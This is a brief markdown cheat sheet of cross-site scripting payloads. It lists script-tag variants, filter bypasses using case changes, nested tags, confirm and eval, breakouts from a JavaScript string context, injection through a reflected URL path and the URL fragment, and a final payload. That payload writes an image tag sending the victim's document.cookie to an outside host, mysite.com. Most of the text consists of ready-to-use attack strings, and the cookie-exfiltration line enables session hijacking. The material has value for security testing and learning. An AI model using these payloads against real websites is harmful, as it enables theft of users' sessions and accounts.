# Cross-Site Scripting (XSS)
```
<script>alert(document.domain)</script>
<sCripT>alert(document.domain)</sCripT>
<sC<script>ripT>alert(document.domain)</sC<script>ripT>
```
#### If alert is restricted,
- Can use confirm(1) [<script>confirm(1)</script>]
- eval("ale"%2b"rt(1)") {%2b is "+"} [<script>eval("ale"%2b"rt(1)")</script>]

#### If the value is echoed back inside JavaScript code, then no need to inject a script tag. <br/>
` ";alert(1); // ` (Depending on the context of the code) <br/>
// (used to comment) also, var.$dummy= " (dummy code to close it) <br/>

#### If the URL is reflected in form or error pages then XSS payload can be inserted into URL to trigger XSS <br/>
Eg: example.com/index.php <br/> 
While viewing source code, <br/>
`<form action="/index.php" method="POST"> ` <br/>
We can, `example.com/index.php/abc"><script>alert(1)</script>` <br/>
This becomes, ` <form action="/index.php/abc"><script>alert(1)</script> ` And the XSS alert box is popped up. <br/>

#### If the URL contains DOM, it is exploited by following: <br/>
URL => example.com/index.php#hacker <br/>
If "hacker" is reflected in source code it can be vulnerable. <br/>
Payload => example.com/index.php#<script>alert(1)</script> <br/>
(Note: It should be reloaded forcefully for payload to execute) <br/>

#### To Obtain Victims Cookie: 
Payload => example.com/index.php?name=hacker</p><script>document.write('<img src="http://mysite.com/?c="+document.cookie+'"/>'); <br/>
(Note: encode + in the URL [%2b]) (c="%2bdocument.cookie%2b'"/>'); <br/>



